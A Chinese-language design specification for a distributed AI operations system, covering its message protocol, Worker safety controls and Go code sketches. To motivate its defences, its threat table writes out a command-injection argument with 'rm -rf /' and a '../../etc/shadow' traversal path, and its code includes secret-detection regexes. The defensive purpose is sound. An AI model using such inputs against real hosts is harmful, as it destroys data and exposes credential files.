# gAIOps 开发者执行规格书

## 1. 项目愿景

**gAIOps** 是一个基于 **契约驱动** 的分布式 AI 运维系统。系统采用三层解耦架构：

- **Brain（Python）** — 决策大脑，基于 LangGraph 构建推理链路
- **Master（TypeScript）** — 调度中枢，负责连接管理、安全审批、结果摘要
- **Worker（Go）** — 执行终端，封装原子运维操作，透传真实系统错误

### 核心准则

| 准则 | 含义 |
|------|------|
| **零模拟原则** | 严禁任何 Mock 数据、欺骗性接口、硬编码成功响应。RAG 未实现就返回"知识库未接入"。代码报错崩溃也强过返回假数据 |
| **确定性** | 所有状态流转和数据交换必须 100% 可预期，拒绝 VibeCoding |
| **架构开放性** | 为后续模块（RAG、多模型等）预留接口空间，但不提前实现或占位 |
| **契约先行** | 任何代码之前，先约定三层间的通信协议 |
| **所有问题显式化** | 沉默吞错、隐式降级、不明确的边界条件都视为设计缺陷，必须在代码中显式处理 |

---

## 2. 架构总览

```
User / Alert Source
        │
        ▼
┌─────────────────────────────────────────────────┐
│  Brain (Python)                                 │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐        │
│  │ Analyst  │ │ Planner  │ │Reflector │        │
│  └──────────┘ └────┬─────┘ └────┬─────┘        │
│                     │            │              │
│  ┌──────────────────▼────────────▼──────────┐   │
│  │       LangGraph State Graph              │   │
│  └──────────────────┬───────────────────────┘   │
│                     │                            │
│  LLM Adapter ───────┤   ← 可切换 LLM 后端       │
└─────────────────────┼───────────────────────────┘
                      │  REST/WS
                      ▼
┌─────────────────────────────────────────────────┐
│  Master (TypeScript)                            │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐        │
│  │ Router   │ │ Tracker  │ │Summarizer│        │
│  └──────────┘ └──────────┘ └──────────┘        │
│  ┌──────────┐ ┌──────────┐                     │
│  │Security  │ │ Approver │                     │
│  └──────────┘ └──────────┘                     │
└─────────────────────┬───────────────────────────┘
                      │ WebSocket (Envelope Protocol)
                      ▼
┌─────────────────────────────────────────────────┐
│  Worker Pool (Go)                               │
│  ┌──────────┐ ┌──────────┐ ┌──────────┐        │
│  │ Ping     │ │ Service  │ │ Process  │   ...  │
│  │ Tool     │ │ Tool     │ │ Tool     │        │
│  └──────────┘ └──────────┘ └──────────┘        │
│  ┌──────────────────────────────────────┐       │
│  │  工具注册中心 + 信封编解码             │       │
│  └──────────────────────────────────────┘       │
└─────────────────────────────────────────────────┘
```

---

## 3. 信封协议（Envelope Protocol）

**这是整个系统的宪法。** 协议不是简单的 JSON 结构，而是涵盖编解码、路由、可靠性、流控、安全的完整契约。任何代码功能必须在协议确定后开始。

### 3.1 当前协议的问题分析

| # | 问题 | 场景 | 后果 |
|---|------|------|------|
| 1 | **无版本号** | 协议升级需要新增字段或调整语义 | 新旧节点无法共存，必须全量停机升级 |
| 2 | **无能力声明** | Worker 上线后 Master 不知道它支持哪些 action | 路由到不支持该操作的 Worker → 运行时错误 |
| 3 | **无优先级** | 磁盘 99% 告警和定时巡检共用一个队列 | 关键操作可能被排队延迟 |
| 4 | **无流控/背压** | Brain 一次性下发 50 条指令 | Worker 队列膨胀，内存溢出 |
| 5 | **大载荷无分片** | `log.tail` 返回 10MB 日志 | 单个 envelope 撑爆 WebSocket 帧缓冲区 |
| 6 | **无身份认证** | 任何进程能连接 WebSocket 端口 | 无防护的攻击面 |
| 7 | **无消息 TTL** | Master 宕机 5 分钟恢复后收到旧请求 | Worker 已不存在，请求空转浪费 |
| 8 | **传递语义未定义** | 连接断开时请求已发出但未回执 | 重复执行（如 service.restart 跑两次）vs 丢失 |
| 9 | **无进度汇报** | `disk.cleanup` 耗时 3 分钟 | Brain 只能干等或超时，不知道中间状态 |
| 10 | **时钟依赖** | Worker 和 Master 时钟差 30 秒 | 超时计算、事件排序出错 |

### 3.2 协议定义（v1）

```json
{
  "proto_version": "1.0",
  "trace_id": "uuid",
  "msg_id": "uuid",
  "msg_type": "request | response | event | ack | heartbeat",
  "timestamp": 1715000000,
  "source": "brain | master | worker",
  "source_id": "string",
  "target": "brain | master | worker | broadcast",
  "target_id": "string | wildcard",
  "correlation_id": "uuid",
  "priority": 0,
  "ttl_seconds": 30,
  "payload": {
    "action": "string",
    "params": {},
    "status": "success | failure | pending | cancelled",
    "data": {},
    "progress": {
      "percent": 0,
      "message": "string"
    },
    "error": {
      "code": "string",
      "message": "string",
      "raw": "string"
    }
  }
}
```

### 3.3 字段详解与设计意图

| 字段 | 解决之问题 | 说明 |
|------|-----------|------|
| `proto_version` | #1 协议演进 | 语义版本号，接收方校验兼容性，不兼容时拒绝连接并报告差异 |
| `source_id` / `target_id` | #2 精准路由 | 节点唯一标识。`target_id` 支持 `*` 通配符（选一个）和 `all`（广播）。Worker 首次连 Master 时必须通过 `event` 上报其支持的 action 列表 |
| `priority` | #3 优先级调度 | 0=常规 / 1=重要 / 2=紧急。Master 高优先级请求插队。Brain 仅在明确场景下发紧急级 |
| — | #4 流控 | 协议层不新增字段，改用**独立机制**：Master 和 Worker 各自维护发送窗口，使用专门的 `ack` 消息实现滑动窗口控制 |
| — | #5 大载荷 | 协议层不新增字段，改用**独立机制**：载荷超过 1MB 时，发送方自动分片为多个 `request` + 同一 `trace_id`，接收方重组 |
| — | #6 认证 | 协议层不新增字段，改用**独立机制**：WebSocket 升级阶段携带 JWT Token，Master 校验后建立连接 |
| `ttl_seconds` | #7 消息过期 | 到达 TTL 仍未处理的消息自动丢弃。Brain 设置的 TTL 应 > Master→Worker 往返时间 + 执行时间余量 |
| `msg_type` + `correlation_id` | #8 传递语义 | `request` → 期待 `response`。若连接断开：已发出但未收到 `ack` 的 `request` 在重连后重新发送。Worker 通过 `msg_id` 去重，保证 at-most-once 执行 |
| `payload.progress` | #9 进度 | 长时间任务主动回传进度百分比和状态描述，Brain 可据此判断是否仍在正常执行 |
| `timestamp` | #10 时钟 | 统一使用 UTC Unix 时间戳。接收方**不依赖时间戳做排序**，仅用于日志和审计。时序由 `correlation_id` 链路决定 |

### 3.4 十项问题的完整解决方案

#### 3.4.1 协议版本协商

连接建立时，双方交换支持的 `proto_version` 范围：

```
Worker → Master: { "proto_version": "1.0", "msg_type": "event", "action": "capability.advertise", "params": { "proto_versions": ["1.0", "1.1"], "actions": ["ping.icmp", "service.status", "disk.usage", ...] } }
Master → Worker: { "msg_type": "response", "status": "success", "data": { "selected_version": "1.0" } }
```

- 版本不兼容 → Master 拒绝连接，Worker 报告"无法接入，协议版本不匹配"
- 兼容性规则：主版本号不同则不兼容，次版本号不同时取较低者

#### 3.4.2 能力声明

Worker 在连接建立后立即发送 `capability.advertise` 事件，声明：
- 支持的 `actions` 列表及参数签名
- 节点元数据（主机名、OS 版本、gAIOps 版本）
- 资源上限（最大并发工具数）

Master 将能力信息存入 `registry.ts`。当 Brain 下发指令时，Master 根据 `action` 匹配具备该能力的 Worker。如果当前无在线 Worker 具备该能力，Master 立即返回错误，不尝试转发。

#### 3.4.3 优先级队列

Master 内部维护三个优先级队列：

```
P0 (紧急): Brain 标记 priority=2 的请求 — 立即处理
P1 (重要): priority=1 的请求 — Worker 空闲时优先处理
P2 (常规): priority=0 的请求 — 默认队列
```

Brain 仅在标记为紧急的场景下使用 `priority=2`：如磁盘满、服务宕机、关键进程消失。不允许 Brain 的 routine 巡检使用高优先级。

#### 3.4.4 滑动窗口流控

每个连接维护独立的发送窗口：

```
窗口大小 = 5（初始值）
每发送一个 request → 窗口 -1
每收到一个 ack → 窗口 +1
窗口 == 0 → 停止发送，进入等待
超时未收到 ack → 窗口重置为 1（拥塞避免）
```

此机制防止任一端过载。Brain → Master、Master → Worker 的连接各自独立计算窗口。

#### 3.4.5 大载荷分片

- 阈值：**1MB**（超过则分片）
- 分片规则：同一 `trace_id`，`correlation_id` 递增
- 标记：`params._chunk_index` 和 `params._chunk_total`
- 接收方：在 `tracker.ts` 中维护分片重组缓冲区，所有分片到齐后合并交付上层处理
- 超时：30 秒内未收齐 → 丢弃已收到分片，返回"分片超时"错误

#### 3.4.6 身份认证

- Master 启动时生成一个 **集群令牌（cluster token）**，写入共享配置
- Worker 启动时携带该令牌
- WebSocket 升级阶段：Worker 在 HTTP Header 中携带 `Authorization: Bearer <token>`
- Master 校验 token 后建立连接，否则关闭
- Brain 访问 Master API 时使用同样的 token 机制（HTTP Header）
- 后续可升级为双向 TLS（mTLS），初期 token 足够

#### 3.4.7 消息 TTL

- Brain 设置 `ttl_seconds`：常规请求 30s，长时间任务（如磁盘清理）设为预期执行时间的 2 倍
- Master 的 `tracker.ts` 中，过期未回执的请求自动标记为 `status: failure, error.code: TTL_EXPIRED`
- Worker 收到已过期的请求（根据 `timestamp` + `ttl_seconds` 判断）→ 直接丢弃，不执行

#### 3.4.8 传递语义

**at-most-once 执行，at-least-once 回执。**

```
Master → Worker: request(msg_id=M1)
Worker → Master: ack(msg_id=M1)          // 确认收到，开始执行
Worker → Master: response(msg_id=M1)     // 执行结果

若连接在 ack 前断开：
  Master 重连后重发 request(msg_id=M1)
  Worker 看到 msg_id=M1 已执行 → 直接回传上次结果（幂等）
  关键约定：Worker 必须缓存最近 N 条 msg_id 及其响应

若连接在 ack 后、response 前断开：
  Master 重连后重发 request(msg_id=M1)
  Worker 看到 msg_id=M1 已 ack 但执行中 → 返回当前进度
```

**幂等要求**：所有实现幂等的工具（查询类天然幂等），需在工具设计时注明是否幂等。非幂等工具（如 `service.restart`）由重试机制产生的重复请求需通过 `msg_id` 去重。

#### 3.4.9 进度汇报

长时间任务（预期 > 5 秒）定期回传 progress：

```json
{
  "msg_type": "event",
  "trace_id": "原 trace_id",
  "correlation_id": "原 correlation_id",
  "payload": {
    "action": "disk.cleanup",
    "status": "pending",
    "progress": { "percent": 45, "message": "清理 /tmp 缓存文件..." }
  }
}
```

Brain 的 Reflector 节点在处理 `pending` 状态时，不判断成功/失败，而是检查 `progress.percent` 是否在合理时间内推进。若 60 秒内进度无变化 → 判定为卡死，触发超时重试。

#### 3.4.10 时钟容错

- `timestamp` 仅用于日志审计，不参与业务逻辑判断
- 超时判定使用**本地时钟 + 单调时间（monotonic clock）**，不依赖远端时间戳
- Master 和 Worker 各自维护本地超时计时器，从收到消息时开始计算
- 日志中 `timestamp` 统一为 UTC，日志分析工具处理时区差异

### 3.5 通信流程（完整版）

```
Brain                           Master                         Worker
 │                                │                              │
 │  ── request ──────────────►    │                              │
 │  (trace_id=X, action=         │                              │
 │   disk.usage, ttl=30,         │    ── request ───────────►   │
 │   priority=1)                 │    (correlation_id=Y)         │
 │                                │                              │
 │                                │    ◄── ack ──────────────    │
 │                                │                              │
 │                                │    ◄── response ─────────    │
 │                                │    (status=success,          │
 │                                │     data: {usage: 85%})      │
 │  ◄── response ────────────    │                              │
 │  (correlation_id=X,           │                              │
 │   status=success,             │                              │
 │   data: {usage: 85%})         │                              │
```

#### 异常路径：Worker 宕机

```
Master 发送 request → 等待 ack 超时 → 重试 2 次 → 失败
Master 标记 Worker 离线 → 尝试路由到其他 Worker（若有）
无可用 Worker → Master 返回 Brain: status=failure, error={code: NO_AVAILABLE_WORKER}
Brain 记录失败日志，进入 Reflector 判断是否需要人工介入
```

#### 异常路径：Master 宕机

```
Brain 发送 request → 连接断开
Brain 进入等待重连（指数退避：1s, 2s, 4s, 8s...max 30s）
Worker 检测到 Master 断开 → 进入"孤岛模式"
  - 停止接受新任务
  - 本地缓存已完成任务的 result
  - 持续尝试重连
Master 恢复 → 重新接受 Worker 连接 → Brain 重发未完成的 request
```

---

## 4. 模块详细设计

### 4.1 阶段零 — 基础设施与协议

#### 4.1.1 基础设施问题分析

| # | 问题 | 场景 | 后果 |
|---|------|------|------|
| 1 | **Worker 引导** | Worker 进程启动时不知道 Master 在哪里 | 无法注册上线 |
| 2 | **配置管理分散** | 三套配置系统，三种格式，容易不一致 | 字段名混乱，排错困难 |
| 3 | **日志分散** | Brain、Master、Worker 各自写日志文件 | 按 `trace_id` 查全链路日志需要手动 grep 三个目录 |
| 4 | **密钥分发** | Worker 需要 SSH 密钥、API token 才能执行运维操作 | 密钥明文存在配置文件中 |
| 5 | **本地开发环境** | 需要同时运行 Ollama + Master + Worker + 目标服务 | 环境搭建成本高，新人上手慢 |
| 6 | **测试策略模糊** | 零模拟原则下怎么测"重启服务"？ | 开发者不敢写测试 |
| 7 | **启动顺序耦合** | Worker 依赖 Master，Brain 依赖 Master，谁先启动？ | 启动脚本需要编排顺序 |
| 8 | **进程管理** | 三个进程崩溃后谁负责拉起？ | 需要外部进程管理器 |
| 9 | **Worker 身份冲突** | 两个同名 Worker 连接同一 Master | 路由混乱，指令发给错误的节点 |
| 10 | **网络分区处理** | Brain↔Master 断连但 Master↔Worker 正常（或反之） | 系统各部分行为不一致 |

#### 4.1.2 解决方案

##### 4.1.2.1 Worker 引导与身份

**问题 1 + 问题 9 的解决方案**：

```
Worker 启动顺序：
1. 读取本地配置文件 worker.yaml，其中包含 master_url 和 worker_id
2. worker_id = 管理员手动分配的 UUID（首次启动时生成，持久化到本地文件）
3. 向 master_url 发起 WebSocket 连接，携带 worker_id 和 cluster_token
4. 如果连接被拒（token 无效 / 版本不兼容 / worker_id 冲突）→ 退出并报告明确错误
5. 连接成功 → 发送 capability.advertise → 进入正常循环
```

**worker_id 冲突**：Master 发现已存在同一 `worker_id` 的连接 → 拒绝新连接，返回 `error.code: WORKER_ID_CONFLICT`。管理员需确保集群内 `worker_id` 唯一。

**Worker 配置模板**：
```yaml
# worker.yaml
worker_id: "uuid-or-hostname"          # 必填，全局唯一
master_url: "ws://master:8080/ws"      # 必填，Master WebSocket 地址
cluster_token: "********"              # 必填，与 Master 共享的令牌
heartbeat_interval: 15                 # 秒，心跳间隔
reconnect:
  base_delay: 1                        # 重连基础延迟（秒）
  max_delay: 60                        # 最大延迟
tools:
  exec:
    allowed_commands:                   # exec.run 的白名单
      - "/usr/bin/systemctl"
      - "/usr/bin/docker"
      - "/bin/df"
```

##### 4.1.2.2 统一配置管理

**问题 2 的解决方案**：不引入额外的配置中心，采用 **每个模块独立的配置文件 + 一份根级环境参考**：

```
├── config/
│   ├── brain.yaml.example        # Brain 配置模板（含注释）
│   ├── master.yaml.example       # Master 配置模板
│   └── worker.yaml.example       # Worker 配置模板
├── .env                          # 本地开发环境变量（不提交 git）
└── scripts/
    └── validate-config.sh        # 校验所有配置文件的脚本
```

- 每个模块启动时读取各自的配置文件
- 配置字段命名统一采用 `snake_case`，三种语言各自映射到本地风格
- 配置文件缺失或字段不合法 → 模块启动失败并报告具体缺失字段
- 不允许"用了默认值"的静默行为

##### 4.1.2.3 结构化日志与链路追踪

**问题 3 的解决方案**：

每个模块输出 JSON 行日志到 stdout，格式统一：

```json
{
  "timestamp": "2026-05-11T10:30:00Z",
  "level": "info | warn | error",
  "module": "brain | master | worker",
  "trace_id": "uuid",
  "msg_id": "uuid",
  "action": "string",
  "message": "human-readable description",
  "data": {},
  "error": {}
}
```

**开发期查询全链路日志**：
```bash
# 三个进程都输出到 stdout，通过管道合并
# 实现方案：scripts/trace.sh <trace_id>
# 功能：grep 所有日志中匹配 trace_id 的行，按时间排序输出
```

生产环境可对接标准日志收集系统（如 Loki、ELK），开发期使用 `tee` + `grep` 足够。

##### 4.1.2.4 密钥管理

**问题 4 的解决方案**：

- **集群通信密钥**（cluster_token）：写入 Worker 本地配置文件，文件权限设为 600
- **运维执行密钥**（SSH 私钥、API token）：通过 Worker 配置文件中的 `credentials_path` 引用外部文件，不硬编码到代码或配置中
- 开发环境：在 `worker.yaml` 中使用 `credentials_path: ./dev-keys/` 指向本地密钥目录
- 生产环境：密钥通过外部编排工具（如 Kubernetes Secrets、Vault）挂载

**关键约束**：密钥文件路径不可达 → Worker 启动失败，不允许缺省密钥回退。

##### 4.1.2.5 开发环境定义

**问题 5 + 问题 7 + 问题 8 的解决方案**：

开发环境 = 一台 Linux 机器上运行以下进程：

```
ollama serve                                  # LLM 服务
master (node src/index.js)                    # 调度中枢
worker (go run cmd/worker/main.go)            # 执行节点（可启动多个）
brain (python main.py)                        # 决策大脑
```

**启动编排**：
```bash
# scripts/dev-up.sh
# 1. 检查 Ollama 是否运行（curl http://localhost:11434/api/tags）
# 2. 检查所需模型是否已拉取
# 3. 启动 Master（前置：配置校验）
# 4. 等待 Master 就绪（curl http://localhost:8080/health）
# 5. 启动 Worker（前置：Master 就绪）
# 6. 启动 Brain（前置：Master 就绪）
# 7. 输出所有进程的 PID 和日志路径
```

**进程管理**：开发期使用 `tmux` 或后台进程。生产期 Master 和 Worker 使用 systemd 托管。

**崩溃恢复（开发期）**：`dev-up.sh` 捕获子进程退出信号，打印"进程 X 已退出，正在重启..."。连续 3 次重启失败 → 停止并报错。

**目标服务**：开发期 Worker 的目标就是**本机**。Worker 对自己执行 `service.status`、`disk.usage` 等操作。这满足"零模拟"——操作是真实的，只是目标是自己。

##### 4.1.2.6 测试策略

**问题 6 的解决方案**：

零模拟原则的测试界定：

| 允许 | 不允许 |
|------|--------|
| 真实 Worker 对自己执行操作进行测试 | 硬编码 `return { status: "ok" }` |
| 在 Docker 容器中启动真实 nginx 后测试 `service.restart` | 用 `mock_service.py` 假装是 nginx |
| 测试前 `set -e` 准备环境，测试后清理 | 不准备真实环境，直接断言成功 |
| Brain 测试时连接真实 Ollama（本地） | Brain 测试时用 `MockLLM("返回固定结果")` |
| 对网络异常、进程崩溃编写故障注入测试 | 忽略错误分支，只测"快乐路径" |

**三层各自的测试策略**：

```
Worker 测试：
  - 单元测试（纯逻辑，如配置解析、协议编解码）— 不需要环境
  - 集成测试（真实工具执行）— 在 CI 容器中对 localhost 执行
  - 每个工具必须有且仅有一个测试文件

Master 测试：
  - 单元测试（协议编解码、路由逻辑、安全拦截规则）
  - 集成测试（启动真实 WS 服务，连接真实 Worker 进程）
  - 审批逻辑测试（模拟审批通过/拒绝/超时场景）

Brain 测试：
  - LangGraph 图逻辑测试（用真实 Ollama + 简短 prompt）
  - LLM Adapter 测试（真实调用一次，验证流式解析）
  - 全链路测试（Brain → Master → Worker → 真实执行）
```

**E2E 测试脚本**：
```bash
# scripts/e2e-test.sh
# 1. 启动 Master
# 2. 启动 Worker（注册到 Master）
# 3. 向 Master 发送 request: ping.icmp target=localhost
# 4. 断言：收到 response 且 status=success
# 5. 向 Master 发送 request: disk.usage
# 6. 断言：收到 response 且 data.usage 是数字
# 7. 关闭 Worker → 断言 Master 标记其为离线
# 8. 启动 Brain → 发送完整推理请求 → 断言 LangGraph 走完完整循环
```

##### 4.1.2.7 网络分区处理

**问题 10 的解决方案**：

| 分区场景 | Master 行为 | Worker 行为 | Brain 行为 |
|----------|-----------|------------|-----------|
| Brain↔Master 断连 | 继续管理 Worker 池，缓存待发送给 Brain 的结果（上限 1000 条） | 正常工作 | 等待重连，重连后重发未完成请求 |
| Master↔Worker 断连 | 标记 Worker 离线，尝试路由给其他 Worker；有审批中的请求时通知 Brain 审批作废 | 进入孤岛模式：缓存已完成结果，持续重连 | 等待 Master 响应或超时 |
| Brain↔Master↔Worker 全断 | 独立存活，广播"失去所有 Worker" | 独立存活，持续重连 | 独立存活，尝试重连 Master |
| 网络恢复 | 重新接受 Worker 连接，处理 Brain 重发请求 | 重新注册，回传缓存的结果 | 重发待处理请求 |

**关键原则**：每个节点在断连状态下必须**独立存活**，不 panic 不退出。恢复后自动同步状态。

---

### 4.2 Worker 层（Go）— 边缘执行节点

**定位**：系统的"手"，执行真实物理操作，透传真实系统错误。

**为何先用 Go 构建**：Worker 无任何内部依赖（只连 Master），可独立开发测试，是整个系统第一个可运行的模块。

#### 4.2.1 Worker 核心问题分析

| # | 问题 | 场景 | 后果 |
|---|------|------|------|
| 1 | **输出/错误超长** | `exec.run` 输出 10MB 编译日志，`log.tail` 读取大文件 | 撑爆 envelope，WebSocket 帧缓冲区溢出，OOM |
| 2 | **工具执行无超时** | `ping.icmp` 发向一个黑洞路由，`service.stop` hang 住 | Worker goroutine 泄漏，最终系统资源耗尽 |
| 3 | **并发失控** | Master 同时下发 50 个 `disk.usage` 请求 | 50 个 goroutine 同时读盘，IO 风暴，Worker 自身卡死 |
| 4 | **参数注入** | `exec.run(params: {command: "systemctl; rm -rf /"})` | 任意命令执行 |
| 5 | **路径遍历** | `log.tail(params: {path: "../../etc/shadow"})` | 越权读取敏感文件 |
| 6 | **敏感数据泄露** | `exec.run` 执行包含密码的命令，输出被原样返回 | 凭证经 Master 透传到 Brain，甚至写入日志 |
| 7 | **panic 传导** | 某个工具代码 panic，整个 Worker 进程崩溃 | 所有正在执行的任务丢失 |
| 8 | **状态缓存膨胀** | `msg_id` 去重表无限增长 | 内存持续上涨直至 OOM |
| 9 | **心跳饿死** | 长任务执行期间（如 `disk.cleanup` 跑 5 分钟），心跳线程被阻塞 | Master 误判 Worker 离线 |
| 10 | **重连风暴** | Master 短暂宕机后恢复，1000 个 Worker 同时重连 | Master 被 SYN 泛洪打垮，大量连接失败后再次重连 |
| 11 | **优雅关闭** | Worker 收到 SIGTERM 时正在执行 `service.restart` | 执行到一半被杀死，目标服务处于不一致状态 |
| 12 | **工具分类缺失** | Master 不知道哪些操作是只读的（安全）、哪些是写操作（需审批） | 审批策略只能在 Master 硬编码，无法动态感知 |

#### 4.2.2 解决方案

##### 4.2.2.1 输出截断与分片（解决 #1）

每个工具的输出统一经过 `OutputLimiter`：

```go
// internal/safety/limiter.go
const (
    MaxOutputSize   = 1 * 1024 * 1024   // 单次输出上限：1MB
    MaxErrorRawSize = 100 * 1024        // error.raw 上限：100KB
)

// TruncateOutput 截断输出并标记
type ToolResult struct {
    Success      bool
    Data         []byte
    Error        *ToolError
    Truncated    bool              // true 表示输出被截断
    TruncatedAt  int64             // 截断前的原始字节数
}

type ToolError struct {
    Code    string
    Message string
    Raw     string                // 截断到 MaxErrorRawSize
    Truncated bool                // true 表示 raw 被截断
}
```

**规则**：
- `payload.data` 超过 **1MB** → 截断 + 标记 `truncated: true` + `truncated_at: 原始大小`
- `payload.error.raw` 超过 **100KB** → 截断 + 标记
- `message` 字段不超过 **1KB**
- 截断时不丢头部（保留文件开头的内容），丢失尾部
- Master 发现 `truncated: true` 后，可在摘要中注明"输出过长已截断（原始 XX MB）"

##### 4.2.2.2 强制执行超时（解决 #2）

每个工具注册时声明其 `timeout`，执行框架强制使用 `context.WithTimeout`：

```go
// internal/registry/registry.go
type Tool struct {
    Action      string
    Execute     func(ctx context.Context, params map[string]interface{}) ToolResult
    Timeout     time.Duration     // 强制超时
    IsIdempotent bool
    RiskLevel   string            // "readonly" | "write" | "dangerous"
}

// internal/executor/sandbox.go
func (e *Executor) Run(action string, params map[string]interface{}) ToolResult {
    tool, ok := e.registry.Get(action)
    if !ok {
        return ToolResult{Success: false, Error: &ToolError{Code: "UNKNOWN_ACTION"}}
    }
    ctx, cancel := context.WithTimeout(context.Background(), tool.Timeout)
    defer cancel()
    
    resultCh := make(chan ToolResult, 1)
    go func() {
        resultCh <- tool.Execute(ctx, params)
    }()
    
    select {
    case result := <-resultCh:
        return result
    case <-ctx.Done():
        return ToolResult{
            Success: false,
            Error: &ToolError{
                Code:    "EXECUTION_TIMEOUT",
                Message: fmt.Sprintf("tool %s timed out after %v", action, tool.Timeout),
                Raw:     ctx.Err().Error(),
            },
        }
    }
}
```

**超时默认值**（可根据实际情况调优）：

| 工具 | 超时 |
|------|------|
| `ping.icmp` | 10s |
| `service.status` | 5s |
| `service.restart` | 30s |
| `disk.usage` | 5s |
| `disk.cleanup` | 300s |
| `process.list` | 5s |
| `process.kill` | 10s |
| `log.tail` | 15s |
| `exec.run` | 60s |

##### 4.2.2.3 并发控制与资源隔离（解决 #3）

Worker 内部维护一个**全局信号量**控制最大并发工具数：

```go
// internal/executor/sandbox.go
type Executor struct {
    registry   *registry.Registry
    semaphore  chan struct{}            // 缓冲 channel，控制并发度
    maxWorkers int
}

func NewExecutor(registry *registry.Registry, maxConcurrent int) *Executor {
    return &Executor{
        registry:   registry,
        semaphore:  make(chan struct{}, maxConcurrent),
        maxWorkers: maxConcurrent,
    }
}

func (e *Executor) Run(action string, params map[string]interface{}) ToolResult {
    tool, ok := e.registry.Get(action)
    // ...
    
    select {
    case e.semaphore <- struct{}{}:     // 获取执行许可
        defer func() { <-e.semaphore }()
    case <-ctx.Done():
        return ToolResult{...超时...}
    }
    // ...执行工具...
}
```

**规则**：
- 最大并发数 = 可配置（默认 5），由 `worker.yaml` 的 `max_concurrent_tools` 控制
- 超出并发限制的请求排队等待（不拒绝，不丢失）
- Master 通过 Worker 的 `capability.advertise` 可感知 Worker 的当前负载（正在执行数 / 最大并发数），用于做路由决策

##### 4.2.2.4 命令白名单与参数消毒（解决 #4）

```go
// internal/tools/exec.go
// exec.run 实现：白名单 + 参数消毒
func (e *ExecTool) Execute(ctx context.Context, params map[string]interface{}) ToolResult {
    command := params["command"].(string)
    args := params["args"].([]string)
    
    // 1. 白名单校验
    if !e.allowedCommands.Contains(command) {
        return ToolResult{Error: &ToolError{Code: "COMMAND_NOT_ALLOWED"}}
    }
    
    // 2. 参数消毒：拒绝包含 shell 特殊字符的参数
    for _, arg := range args {
        if containsShellMetachar(arg) {
            return ToolResult{Error: &ToolError{Code: "INVALID_ARG", Message: "arg contains shell metacharacters"}}
        }
    }
    
    // 3. 使用 exec.CommandContext（受 context 控制超时），禁止通过 shell 启动
    cmd := exec.CommandContext(ctx, command, args...)
    // ...
}
```

**禁止行为**：
- 禁止 `exec.Command("bash", "-c", ...)` 或 `exec.Command("sh", "-c", ...)` 间接执行
- 禁止将用户输入直接拼接到命令字符串
- 白名单路径必须使用绝对路径（`/usr/bin/systemctl` 而非 `systemctl`）

##### 4.2.2.5 路径消毒（解决 #5）

所有涉及文件路径的工具（`log.tail`、`disk.usage` 等）统一使用路径消毒：

```go
// internal/safety/path.go
import "path/filepath"

func SanitizePath(requested string, allowedRoots []string) (string, error) {
    clean := filepath.Clean(requested)
    abs, err := filepath.Abs(clean)
    if err != nil {
        return "", err
    }
    
    // 必须在允许的根目录下
    for _, root := range allowedRoots {
        rootAbs, _ := filepath.Abs(root)
        if strings.HasPrefix(abs, rootAbs) {
            return abs, nil
        }
    }
    return "", fmt.Errorf("path %s is not allowed", requested)
}
```

规则：
- 每个 Worker 配置中声明 `allowed_log_paths` 和 `allowed_disk_paths`
- 路径必须解析为绝对路径后校验前缀，阻止 `../../` 绕过
- 符号链接也需要解析（在典型 OS 运维场景下，日志路径通常无 symlink，初期不做自动解析；若发现绕过再补充）

##### 4.2.2.6 敏感输出过滤（解决 #6）

```go
// internal/safety/filter.go
var sensitivePatterns = []*regexp.Regexp{
    regexp.MustCompile(`(?i)(password|passwd|secret|token|api[_-]?key)\s*[:=]\s*\S+`),
    regexp.MustCompile(`(?i)-----BEGIN\s+(RSA|EC|OPENSSH)\s+PRIVATE\s+KEY-----`),
}

func FilterSensitive(data string) string {
    for _, pattern := range sensitivePatterns {
        data = pattern.ReplaceAllString(data, "${1}: ***FILTERED***")
    }
    return data
}
```

规则：
- `exec.run` 和 `log.tail` 的输出返回前必须经过 `FilterSensitive`
- 过滤不是可选项，是框架层强制执行的
- 过滤后的内容仍可通过 `truncated` 字段知晓"原始数据已被过滤"

##### 4.2.2.7 Panic 安全防护（解决 #7）

执行框架使用 `recover` 包装所有工具调用：

```go
// internal/executor/sandbox.go
func (e *Executor) Run(action string, params map[string]interface{}) (result ToolResult) {
    defer func() {
        if r := recover(); r != nil {
            result = ToolResult{
                Success: false,
                Error: &ToolError{
                    Code:    "TOOL_PANIC",
                    Message: fmt.Sprintf("tool %s panicked", action),
                    Raw:     fmt.Sprintf("%v", r),
                },
            }
            // 同时输出到 Worker 自身 stderr，用于进程级排查
            fmt.Fprintf(os.Stderr, "[PANIC] tool=%s panic=%v\n", action, r)
        }
    }()
    // ... 执行工具 ...
}
```

**关键约束**：`recover` 只能捕获当前 goroutine 的 panic。如果工具内部启动新 goroutine 且不处理 panic，框架无法挽救。工具开发者必须在工具内部 goroutine 中自行处理 panic。

##### 4.2.2.8 去重缓存管理（解决 #8）

```go
// internal/connection/dedup.go
type DedupCache struct {
    mu       sync.RWMutex
    capacity int
    entries  map[string]ToolResult
    order    []string           // FIFO 顺序
}

func (c *DedupCache) Get(msgID string) (ToolResult, bool) {
    c.mu.RLock()
    defer c.mu.RUnlock()
    result, ok := c.entries[msgID]
    return result, ok
}

func (c *DedupCache) Set(msgID string, result ToolResult) {
    c.mu.Lock()
    defer c.mu.Unlock()
    if len(c.order) >= c.capacity {
        // 淘汰最旧的一条
        delete(c.entries, c.order[0])
        c.order = c.order[1:]
    }
    c.entries[msgID] = result
    c.order = append(c.order, msgID)
}
```

**规则**：
- 容量固定：默认 1024 条，可配置
- FIFO 淘汰，不涉及 LRU（避免额外开销）
- 重启后缓存丢失，但此时 Master 也会重连并清空 tracker，所以一致性不会出问题

##### 4.2.2.9 心跳与长任务分离（解决 #9）

心跳必须在独立 goroutine 中运行，不受工具执行影响：

```go
// internal/connection/client.go
type WSClient struct {
    conn         *websocket.Conn
    heartbeatCh  chan struct{}
    done         chan struct{}
}

func (c *WSClient) StartHeartbeat(ctx context.Context, interval time.Duration) {
    go func() {
        ticker := time.NewTicker(interval)
        defer ticker.Stop()
        for {
            select {
            case <-ticker.C:
                // 直接通过 WebSocket 连接发送 ping 帧（协议层心跳）
                // 不经过工具执行队列
                err := c.conn.WriteControl(websocket.PingMessage, []byte("heartbeat"), time.Now().Add(5*time.Second))
                if err != nil {
                    // 心跳失败 → 关闭连接 → 触发重连
                    c.Close()
                    return
                }
            case <-c.done:
                return
            }
        }
    }()
}
```

**规则**：
- 使用 WebSocket 协议层的 `Ping`/`Pong` 帧做心跳，不经过工具执行队列
- Master 端 3 个心跳周期未收到 Pong → 判定 Worker 离线
